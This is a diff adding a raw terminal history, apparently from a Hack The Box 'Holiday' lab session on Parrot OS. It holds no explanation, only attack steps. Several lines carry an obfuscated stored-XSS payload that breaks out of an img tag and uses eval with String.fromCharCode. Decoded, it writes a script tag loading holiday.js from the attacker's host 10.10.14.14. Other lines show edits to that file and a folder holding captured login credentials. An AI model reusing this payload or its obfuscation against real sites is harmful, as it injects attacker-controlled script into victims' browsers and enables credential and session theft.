@@ -1,0 +1,16 @@
+root@parrot:~/hackthebox/holiday# echo <img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>              
+>                                       
+> ^C                                    
+root@parrot:~/hackthebox/holiday# echo <img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>^C                                     
+root@parrot:~/hackthebox/holiday# vi fake/holiday.js                            
+root@parrot:~/hackthebox/holiday# mv fake/holiday.js .                          
+root@parrot:~/hackthebox/holiday# ls    
+fake  gobuster_list  holiday.js  login_creds  login.req  nmap  script  tmp      
+root@parrot:~/hackthebox/holiday# vi holiday.js                                 
+root@parrot:~/hackthebox/holiday# vi holiday.js                                 
+root@parrot:~/hackthebox/holiday# vi holiday.js                                 
+root@parrot:~/hackthebox/holiday# vi holiday.js                                 
+root@parrot:~/hackthebox/holiday# vi holiday.js                                 
+root@parrot:~/hackthebox/holiday# <img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,52,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>">^C               
+root@parrot:~/hackthebox/holiday# vi holiday.js                                 
+root@parrot:~/hackthebox/holiday#       
